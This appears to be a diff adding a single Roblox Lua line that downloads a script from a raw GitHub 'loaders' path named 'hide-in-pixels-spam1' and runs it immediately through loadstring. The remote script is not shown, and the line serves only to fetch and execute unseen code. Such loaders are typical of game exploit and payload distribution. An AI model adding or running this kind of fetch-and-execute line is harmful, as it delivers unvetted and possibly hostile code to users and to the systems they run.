@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/hide-in-pixels-spam1-my0f8p8tm93ssv.lua"))()
